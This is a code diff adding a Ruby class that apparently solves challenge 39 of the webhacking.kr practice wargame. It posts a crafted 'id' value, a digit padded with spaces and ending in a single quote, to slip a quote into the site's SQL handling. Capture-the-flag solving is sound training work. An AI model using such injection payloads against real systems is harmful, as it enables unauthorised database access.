@@ -756,6 +756,25 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 39
+  class Challenge39 < ChallengeBase
+    CHALLENGE = 39
+
+    PATH = '/challenge/bonus-10/'
+    PARAM_ID = 'id'
+    PAYLOAD = "1             '"
+
+    def exec
+      log('Sending payload')
+      response = post(
+        PATH,
+        { PARAM_ID => PAYLOAD }
+      )
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 40
   class Challenge40 < ChallengeBase
     CHALLENGE = 40
